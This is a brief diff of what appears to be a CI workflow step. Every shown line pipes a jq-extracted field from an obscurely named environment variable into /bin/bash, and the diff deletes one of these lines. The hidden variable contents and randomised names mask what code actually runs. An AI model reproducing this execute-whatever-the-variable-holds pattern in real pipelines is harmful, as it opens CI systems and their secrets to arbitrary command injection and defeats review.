@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$fkf36917" | jq -r .uzsd8352 | /bin/bash
           echo $j7820 | jq -r .lffk2898 | /bin/bash
           echo $z75518 | jq -r .kwqw1 | /bin/bash
-          printf '%s' "$fulyh69380" | jq -r .xfd0727 | /bin/bash
           echo $izwoi4072 | jq -r .amu5634 | /bin/bash
 
       - name: Store output
